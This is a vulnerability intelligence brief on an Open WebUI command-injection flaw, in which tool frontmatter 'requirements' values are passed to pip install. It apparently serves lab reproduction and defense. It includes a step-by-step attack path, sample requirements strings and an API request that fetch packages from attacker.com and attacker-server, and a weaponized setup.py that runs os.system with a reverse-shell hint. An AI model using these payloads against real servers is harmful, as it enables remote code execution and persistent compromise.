# Intel Brief: CVE-2026-0765

## CVE Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-0765 |
| **Title** | Open WebUI PIP install_frontmatter_requirements Command Injection RCE |
| **Affected Software** | Open WebUI (open-webui) |
| **Vendor** | openwebui (GitHub: open-webui/open-webui) |
| **Affected Version** | 0.6.32 (explicitly listed in advisory; vulnerable since commit `367fa039a` on 2024-08-08) |
| **CVSS Score** | 8.8 (HIGH) |
| **CVSS Vector** | CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **EPSS** | 0.6% (70.3rd percentile) |
| **CWE** | CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') |
| **Published** | 2026-01-23 |
| **ZDI Advisory** | ZDI-26-031 / ZDI-CAN-28258 (0-day — vendor failed to respond) |
| **GHSA** | GHSA-qr7m-hwp7-qjqg |
| **Credits** | Peter Girnus (@gothburz), Brandon Niemczyk (Trend Micro ZDI) |

## Description

The vulnerability exists in the `install_frontmatter_requirements()` function in `backend/open_webui/utils/plugin.py`. This function processes user-supplied Python package requirements from tool/function frontmatter metadata and passes them directly to `subprocess.check_call()` as arguments to `pip install` without any validation or sanitization.

An authenticated user with tool/function creation permissions can craft malicious frontmatter `requirements` values that inject arbitrary arguments into the `pip install` command. Since pip supports installing from arbitrary URLs (including git repositories with malicious `setup.py` files), this allows Remote Code Execution (RCE) on the server with the privileges of the Open WebUI service account.

### ZDI Advisory Quote
> "The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call."

### Disclosure Timeline
- **2025-10-09**: Reported to vendor by Trend Micro ZDI
- **2026-01-09**: Public advisory (ZDI-26-031) after vendor failed to respond/patch
- **2026-01-23**: CVE published

### Attack Vector Details

1. **Entry Points**: The vulnerable function is called from:
   - `POST /api/v1/tools/create` — requires `workspace.tools` permission or admin role
   - `POST /api/v1/tools/{id}/update` — requires tool ownership, group write access, or admin role
   - `POST /api/v1/functions/create` — requires admin role
   - `POST /api/v1/functions/{id}/update` — requires admin role
   - `POST /api/v1/functions/sync` — requires admin role
   - Server startup via `install_tool_and_function_dependencies()` — processes stored tools/functions

2. **Frontmatter Format**: Tools and functions in Open WebUI use Python docstring-style frontmatter:
   ```python
   """
   title: My Tool
   requirements: malicious-payload-here
   """
   ```

3. **Vulnerable Code** (lines 276-288 of plugin.py at v0.6.32):
   ```python
   def install_frontmatter_requirements(requirements: str):
       if requirements:
           try:
               req_list = [req.strip() for req in requirements.split(",")]
               log.info(f"Installing requirements: {' '.join(req_list)}")
               subprocess.check_call(
                   [sys.executable, "-m", "pip", "install"]
                   + PIP_OPTIONS
                   + req_list
                   + PIP_PACKAGE_INDEX_OPTIONS
               )
           except Exception as e:
               log.error(f"Error installing packages: {' '.join(req_list)}")
               raise e
   ```
   The `requirements` string is split by comma and each element is passed as a separate argument to `pip install`. No validation is performed on the package names/specifiers.

4. **Exploitation Approach**: While `subprocess.check_call()` uses list form (no shell injection), pip itself can be abused:
   - **Malicious package from URL**: `git+https://attacker.com/repo.git#egg=pkg` — pip will clone and execute `setup.py`
   - **Direct URL install**: `https://attacker.com/evil-1.0.tar.gz` — pip downloads and installs with `setup.py` execution
   - **Argument injection**: Injecting pip flags like `--extra-index-url` to redirect installations
   - **Typosquatting/malicious PyPI packages**: Specifying a package name that maps to a malicious package

## Repository Information

| Field | Value |
|---|---|
| **Repository URL** | https://github.com/open-webui/open-webui.git |
| **Vulnerable Version** | v0.6.32 (tag, commit `37d1c85c996e1bdcd505e1e6d62b2f17acd8df23`) |
| **Checked Out Version** | v0.6.32 |
| **Fix Commit** | **NONE** — vulnerability remains unfixed as of v0.8.5 (latest tag) |
| **Patched Version** | **NONE** — 0-day disclosure; vendor has not patched |
| **Vulnerable Since** | Commit `367fa039a0fa0f7d3599437421057186549761e2` (2024-08-08) — "added install_frontmatter_requirements" |

### Version Notes
- The vulnerability was introduced in commit `367fa039a` (Aug 8, 2024) and exists in all versions since then.
- v0.6.32 is the version explicitly listed in the CVE advisory (Sep 29, 2025 release).
- The ZDI advisory (Jan 9, 2026) was published as a 0-day after the vendor closed the report without providing a fix.
- ZDI mitigation recommendation: "The only salient mitigation strategy is to restrict interaction with the product."

## Vulnerable File

**File**: `backend/open_webui/utils/plugin.py`
**Function**: `install_frontmatter_requirements()` (line 276 at v0.6.32)
**Callers**:
- `load_tool_module_by_id()` (line ~85) — called during tool creation/update when `content` is provided
- `load_function_module_by_id()` (line ~129) — called during function creation/update
- `install_tool_and_function_dependencies()` (line ~298) — called at server startup

### Frontmatter Extraction
**Function**: `extract_frontmatter()` — `plugin.py` lines 18-51
- Parses triple-quoted docstring at the beginning of content
- Uses regex `r"^\s*([a-z_]+):\s*(.*)\s*$"` to extract key-value pairs
- The `requirements` key value becomes the attack payload
- **No validation** is performed on the extracted values

### PIP Environment Variables
From `backend/open_webui/env.py`:
```python
PIP_OPTIONS = os.getenv("PIP_OPTIONS", "").split()           # default: empty
PIP_PACKAGE_INDEX_OPTIONS = os.getenv("PIP_PACKAGE_INDEX_OPTIONS", "").split()  # default: empty
```

## Build System

| Field | Value |
|---|---|
| **Primary Language** | Python 3.11+ |
| **Frontend** | SvelteKit (Node.js 22) — NOT needed for PoC |
| **Build System** | Python: hatchling (pyproject.toml); Frontend: npm |
| **Base Docker Image** | python:3.11-slim-bookworm |
| **Container Port** | 8080 |
| **App Server** | uvicorn (FastAPI) |
| **Database** | SQLite (default), PostgreSQL (optional) |
| **Startup Command** | `bash start.sh` → uvicorn |
| **Official Docker Image** | `ghcr.io/open-webui/open-webui:v0.6.32` |

### Key Dependencies
- **FastAPI** 0.115.7 — web framework
- **uvicorn** 0.35.0 — ASGI server
- **SQLAlchemy** 2.0.38 — ORM
- **pydantic** 2.11.7 — data validation
- **python-jose** 3.4.0 — JWT handling
- **passlib** 1.7.4 — password hashing
- **bcrypt** 4.3.0 — password hashing backend

### Docker Build Notes
- The official image `ghcr.io/open-webui/open-webui:v0.6.32` contains the exact vulnerable version
- For PoC reproduction, only the **backend** is needed (the vuln is server-side)
- The app requires a `WEBUI_SECRET_KEY` for JWT auth
- Default port is 8080
- Use `USE_SLIM_DOCKER=true` to skip ML model downloads for faster builds
- Container runs as **root** (UID=0) by default — maximum post-exploitation impact

## Public Exploits

**No public exploits found** in ExploitDB, Metasploit, GitHub PoCs, or Nuclei templates as of 2026-03-01.

## Reproduction Strategy

### Simplest Attack Path (First-User-Admin on Fresh Instance)

1. **Deploy Open WebUI v0.6.32** via Docker (slim mode, no Ollama needed)
2. **Sign up as the first user** via `POST /api/v1/auths/signup` → automatically becomes admin
3. **Create a malicious tool** via `POST /api/v1/tools/create` with frontmatter containing a crafted `requirements` value pointing to a malicious package (e.g., `git+https://...` with a weaponized `setup.py`)
4. The `install_frontmatter_requirements()` function will execute `pip install` with the attacker-controlled arguments
5. pip clones the malicious repo and executes `setup.py` → **RCE achieved**

### Authentication Flow
```
# 1. Sign up (first user = admin)
POST /api/v1/auths/signup
{"email":"attacker@poc.local","password":"password123","name":"Attacker"}
→ Returns: {"token": "<JWT>", ...}

# 2. Create malicious tool
POST /api/v1/tools/create
Authorization: Bearer <JWT>
{
  "id": "exploit_tool",
  "name": "Exploit",
  "content": "\"\"\"\ntitle: Exploit\nrequirements: git+https://attacker-server/malicious-repo.git#egg=pkg\n\"\"\"\n\nclass Tools:\n    pass",
  "meta": {"description": ""}
}
```

### Malicious Package (setup.py)
```python
from setuptools import setup
import os
os.system("id > /tmp/pwned")  # or reverse shell
setup(name="harmless", version="1.0")
```

### PoC Considerations
- The PoC should host a malicious Python package (tar.gz or git repo) on a local HTTP server reachable from the Open WebUI container
- Verify RCE via marker file (`/tmp/pwned`) or network callback
- The simplest approach: host a `.tar.gz` sdist package on a local HTTP server within the Docker network

## Lab Environment

| Field | Value |
|---|---|
| **Container Name** | `cve-2026-0765-vulnerable` |
| **Docker Image** | `ghcr.io/open-webui/open-webui:v0.6.32` |
| **Host Port** | 8080 |
| **Networks** | `lab-net` (internal) |
| **Running User** | root (UID=0) |
| **Python** | 3.11 |
| **pip** | 24.0 |
| **git** | 2.39.5 |

## References

1. **ZDI Advisory**: https://www.zerodayinitiative.com/advisories/ZDI-26-031/
2. **GitHub Repository**: https://github.com/open-webui/open-webui
3. **GHSA**: GHSA-qr7m-hwp7-qjqg
4. **Introduction commit**: https://github.com/open-webui/open-webui/commit/367fa039a0fa0f7d3599437421057186549761e2
5. **Vulnerable tag (v0.6.32)**: https://github.com/open-webui/open-webui/releases/tag/v0.6.32
6. **Docker Image**: ghcr.io/open-webui/open-webui:v0.6.32

## Additional Notes

### exec() Code Execution (Related but Separate)
Beyond the pip command injection (CVE-2026-0765), the same code path also contains **direct arbitrary code execution** via `exec()`:
- `plugin.py` line ~101: `exec(content, module.__dict__)` in `load_tool_module_by_id()`
- `plugin.py` line ~145: `exec(content, module.__dict__)` in `load_function_module_by_id()`

The entire `content` field is executed as Python code. This is a separate, independent vulnerability. The `exec()` calls execute *after* `install_frontmatter_requirements()` runs. CVE-2026-0765 specifically covers the pip injection vector via frontmatter requirements.

### Persistence
A previously-stored malicious tool/function re-executes its requirements payload on every server restart via `install_tool_and_function_dependencies()`. This provides persistence even after the immediate exploit.
